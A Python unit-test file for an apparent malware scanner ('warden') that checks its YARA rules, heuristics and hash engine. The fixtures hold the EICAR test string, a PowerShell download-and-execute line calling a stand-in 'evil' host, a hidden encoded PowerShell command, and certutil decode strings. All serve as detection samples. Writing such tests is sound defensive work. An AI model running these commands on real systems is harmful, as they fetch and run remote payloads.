"""Fast, offline unit tests. No real malware, no network, no disk-write of EICAR
(so Windows Defender can't interfere)."""


from warden.config import BUNDLED_RULES_DIR
from warden.engines.base import ScanContext
from warden.engines.heuristics import HeuristicsEngine
from warden.engines.yara_engine import YaraEngine
from warden.models import Severity

# EICAR built at runtime so this source file itself isn't flagged by scanners.
EICAR = (
    "X5O!P%@AP[4" + chr(92) + "PZX54(P^)7CC)7}"
    + chr(36) + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!" + chr(36) + "H+H*"
).encode()


def _MemCtx(data: bytes, name: str = "mem.bin") -> ScanContext:
    return ScanContext.from_bytes(name, data)


def test_yara_detects_eicar():
    eng = YaraEngine([BUNDLED_RULES_DIR])
    assert eng.available(), eng.status
    findings = eng.scan(_MemCtx(EICAR))
    names = {f.name for f in findings}
    assert "EICAR_Test_File" in names
    assert max(f.severity for f in findings) == Severity.CRITICAL


def test_yara_detects_powershell_downloader():
    eng = YaraEngine([BUNDLED_RULES_DIR])
    payload = b'IEX (New-Object Net.WebClient).DownloadString("http://evil/x")'
    findings = eng.scan(_MemCtx(payload, "x.ps1"))
    assert any(f.name == "Suspicious_PowerShell_Downloader" for f in findings)


def test_yara_lolbin_rules_skip_large_binaries():
    """Command/script rules must not fire inside big binaries (FP guard)."""
    eng = YaraEngine([BUNDLED_RULES_DIR])
    # certutil strings embedded in a 3 MB blob (simulates a large signed exe).
    big = b"certutil -decode payload" + b"\x00" * (3 * 1024 * 1024)
    findings = eng.scan(_MemCtx(big, "big.exe"))
    assert not any(f.name == "Certutil_LOLBin_Abuse" for f in findings)
    # Same strings in a small script SHOULD still be caught.
    small = b"certutil -decode evil.b64 evil.exe"
    findings2 = eng.scan(_MemCtx(small, "x.bat"))
    assert any(f.name == "Certutil_LOLBin_Abuse" for f in findings2)


def test_heuristics_fake_double_extension():
    eng = HeuristicsEngine()
    findings = eng.scan(_MemCtx(b"whatever", "invoice.pdf.exe"))
    assert any(f.name == "fake-double-extension" and f.severity == Severity.HIGH
               for f in findings)


def test_heuristics_suspicious_script():
    eng = HeuristicsEngine()
    payload = b"powershell -nop -w hidden -enc ZQ==; IEX (DownloadString)"
    findings = eng.scan(_MemCtx(payload, "a.ps1"))
    assert any(f.name == "suspicious-script-content" for f in findings)


def test_clean_file_has_no_findings():
    eng = HeuristicsEngine()
    findings = eng.scan(_MemCtx(b"just a normal note, nothing here", "notes.txt"))
    assert findings == []


def test_scancontext_sha1_and_sha256(tmp_path):
    import hashlib

    from warden.engines.base import ScanContext
    data = b"warden hashing test"
    f = tmp_path / "x.bin"
    f.write_bytes(data)
    ctx = ScanContext(f, len(data), 1 << 20)
    assert ctx.sha256() == hashlib.sha256(data).hexdigest()
    assert ctx.sha1() == hashlib.sha1(data).hexdigest()


def test_hash_engine_offline_needs_no_network():
    """With no reputation provider, the hash engine never touches the network."""
    from warden.engines.hashcheck import HashEngine
    eng = HashEngine([], reputation=None)
    assert eng.scan(_MemCtx(b"anything", "a.exe")) == []
